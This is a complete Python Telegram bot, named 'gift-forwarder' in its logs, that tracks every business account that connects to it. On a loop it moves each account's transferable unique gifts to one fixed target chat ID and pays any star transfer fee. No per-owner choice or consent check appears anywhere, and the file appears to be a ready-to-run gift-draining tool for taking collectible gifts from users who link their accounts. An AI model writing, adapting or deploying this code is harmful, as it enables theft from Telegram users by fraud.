import json
import logging
import os
import time
from pathlib import Path
from typing import Any

import requests
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
TARGET_CHAT_ID_RAW = os.getenv("TARGET_CHAT_ID", "").strip()
POLL_SECONDS = int(os.getenv("POLL_SECONDS", "30"))
STATE_FILE = Path("connections.json")
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)
log = logging.getLogger("gift-forwarder")

if not BOT_TOKEN:
    raise SystemExit("BOT_TOKEN is missing in .env")
if not TARGET_CHAT_ID_RAW:
    raise SystemExit("TARGET_CHAT_ID is missing in .env")

try:
    TARGET_CHAT_ID = int(TARGET_CHAT_ID_RAW)
except ValueError as exc:
    raise SystemExit("TARGET_CHAT_ID must be a numeric Telegram chat/user ID") from exc


def api(method: str, payload: dict[str, Any] | None = None) -> Any:
    response = requests.post(
        f"{API_URL}/{method}",
        json=payload or {},
        timeout=60,
    )
    response.raise_for_status()
    data = response.json()
    if not data.get("ok"):
        raise RuntimeError(f"Telegram API {method} failed: {data}")
    return data["result"]


def load_connections() -> dict[str, dict[str, Any]]:
    if not STATE_FILE.exists():
        return {}
    try:
        return json.loads(STATE_FILE.read_text(encoding="utf-8"))
    except json.JSONDecodeError:
        log.warning("connections.json is invalid; starting with an empty state")
        return {}


def save_connections(connections: dict[str, dict[str, Any]]) -> None:
    temp = STATE_FILE.with_suffix(".tmp")
    temp.write_text(
        json.dumps(connections, ensure_ascii=False, indent=2),
        encoding="utf-8",
    )
    temp.replace(STATE_FILE)


def is_unique_gift(gift: dict[str, Any]) -> bool:
    # Telegram's OwnedGiftUnique objects have type == "unique".
    return gift.get("type") == "unique"


def transferable_now(gift: dict[str, Any]) -> bool:
    if gift.get("can_be_transferred") is not True:
        return False

    next_transfer_date = gift.get("next_transfer_date")
    if next_transfer_date is None:
        return True

    return int(next_transfer_date) <= int(time.time())


def transfer_gift(connection_id: str, gift: dict[str, Any]) -> bool:
    owned_gift_id = gift["owned_gift_id"]
    payload: dict[str, Any] = {
        "business_connection_id": connection_id,
        "owned_gift_id": owned_gift_id,
        "new_owner_chat_id": TARGET_CHAT_ID,
    }

    star_count = int(gift.get("transfer_star_count") or 0)
    if star_count > 0:
        payload["star_count"] = star_count

    return bool(api("transferGift", payload))


def scan_connection(connection_id: str) -> None:
    offset = ""
    total = 0

    while True:
        result = api(
            "getBusinessAccountGifts",
            {
                "business_connection_id": connection_id,
                "exclude_unique": False,
                "offset": offset,
                "limit": 100,
            },
        )

        gifts = result.get("gifts", [])
        for gift in gifts:
            total += 1
            if not is_unique_gift(gift):
                continue
            if not transferable_now(gift):
                continue

            owned_gift_id = gift.get("owned_gift_id")
            if not owned_gift_id:
                continue

            stars = int(gift.get("transfer_star_count") or 0)
            try:
                ok = transfer_gift(connection_id, gift)
                log.info(
                    "Transferred unique gift %s -> %s (Stars: %s)",
                    owned_gift_id,
                    TARGET_CHAT_ID,
                    stars,
                )
                if not ok:
                    log.error("Telegram returned false for gift %s", owned_gift_id)
            except Exception as exc:
                # Keep scanning the remaining gifts if one gift fails.
                log.error("Failed to transfer gift %s: %s", owned_gift_id, exc)

        offset = result.get("next_offset") or ""
        if not offset:
            break

    log.info("Scanned connection %s: %d gifts", connection_id, total)


def handle_updates(offset: int | None) -> int | None:
    payload: dict[str, Any] = {
        "timeout": 25,
        "allowed_updates": ["business_connection"],
    }
    if offset is not None:
        payload["offset"] = offset

    updates = api("getUpdates", payload)
    next_offset = offset

    for update in updates:
        update_id = update.get("update_id")
        if isinstance(update_id, int):
            next_offset = update_id + 1

        connection = update.get("business_connection")
        if not connection:
            continue

        connection_id = connection.get("id")
        if not connection_id:
            continue

        connections = load_connections()
        if connection.get("is_enabled"):
            connections[connection_id] = {
                "user_id": connection.get("user", {}).get("id"),
                "username": connection.get("user", {}).get("username"),
                "connected_at": connection.get("date"),
            }
            save_connections(connections)
            log.info(
                "Business account connected: connection_id=%s user_id=%s",
                connection_id,
                connection.get("user", {}).get("id"),
            )
        else:
            connections.pop(connection_id, None)
            save_connections(connections)
            log.info("Business account disconnected: connection_id=%s", connection_id)

    return next_offset


def main() -> None:
    log.info("Starting Telegram Gift Forwarder")
    log.info("Target chat ID: %s", TARGET_CHAT_ID)

    try:
        me = api("getMe")
        log.info("Bot: @%s (%s)", me.get("username"), me.get("id"))
    except Exception as exc:
        raise SystemExit(f"Could not connect to Telegram: {exc}") from exc

    offset: int | None = None
    last_scan = 0.0

    while True:
        try:
            offset = handle_updates(offset)

            now = time.time()
            if now - last_scan >= POLL_SECONDS:
                connections = load_connections()
                for connection_id in list(connections):
                    try:
                        scan_connection(connection_id)
                    except Exception as exc:
                        log.error(
                            "Failed to scan connection %s: %s",
                            connection_id,
                            exc,
                        )
                last_scan = now
        except KeyboardInterrupt:
            log.info("Stopped")
            return
        except Exception as exc:
            log.error("Main loop error: %s", exc)
            time.sleep(5)


if __name__ == "__main__":
    main()
